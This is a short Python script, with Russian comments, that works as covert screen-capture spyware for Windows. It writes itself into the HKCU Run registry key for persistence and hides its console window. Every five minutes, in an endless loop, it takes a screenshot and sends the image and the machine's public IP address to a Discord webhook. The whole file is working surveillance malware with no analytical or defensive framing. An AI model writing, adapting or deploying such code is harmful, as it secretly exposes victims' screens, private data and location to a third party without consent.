import time
import requests
from dhooks import Webhook, File
from PIL import ImageGrab
import win32gui
import win32console
import win32gui_struct
import os
import shutil
import winreg


exe_path = r"C:\\Users\\VLAD\\Desktop\\screen\\main.py"


autostart_folder = os.path.join(os.getenv("APPDATA"), "Microsoft\\Windows\\Start Menu\\Programs\\Startup")


reg_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)


winreg.SetValueEx(reg_key, "Мой скрипт", 0, winreg.REG_SZ, exe_path)


winreg.CloseKey(reg_key)


def hide_console():
    win = win32console.GetConsoleWindow()
    win32gui.ShowWindow(win, 0)


hide_console()

# URL вебхука Discord

Hooks =Webhook("https://discord.com/api/webhooks/")
def get_ip_address():
    try:
        response = requests.get('https://api.ipify.org/?format=json')
        data = response.json()
        ip_address = data['ip']
        return ip_address
    except requests.exceptions.RequestException as e:
        print("Произошла ошибка при получении IP-адреса:", e)
        return None

while True:

    current_time = time.strftime("%Y-%m-%d %H-%M-%S", time.localtime())


    file_name = "C:\\Windows\\Temp\\123.png"


    screenshot = ImageGrab.grab()


    screenshot.save(file_name)

    with open(file_name, "rb") as f:
        screenshot_data = f.read()

    Hooks.send(get_ip_address(), file=File("C:\\Windows\\Temp\\123.png"))
    
    time.sleep(300)